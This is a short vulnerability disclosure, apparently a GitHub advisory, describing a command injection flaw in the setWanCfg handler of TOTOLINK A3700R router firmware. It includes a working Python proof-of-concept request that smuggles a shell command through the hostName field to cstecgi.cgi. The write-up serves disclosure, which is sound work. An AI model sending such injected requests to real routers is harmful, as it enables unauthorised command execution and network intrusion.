## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：[https://download.totolink.tw/uploads/firmware/A3700R/TOTOLINK_A3700R_V9.1.2u.6165_20211012.zip](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/257/ids/36.html)

## Affected version

A3700R V9.1.2u.6165_20211012

## Vulnerability details

In the A3700R V9.1.2u.6165_20211012 firmware has a command injection vulnerability in the `setWanCfg` function. The `v48` variable receives the `hostName` parameter from a POST request. However, since the user can control the input of `hostName`, the statement `doSystem` can cause a buffer command injection vulnerability.

![image-20240719022247585](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719022247585.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setWanCfg",
"hostName":"';ls -al ../ ;'",
"proto":"80"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719022336777](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719022336777.png)
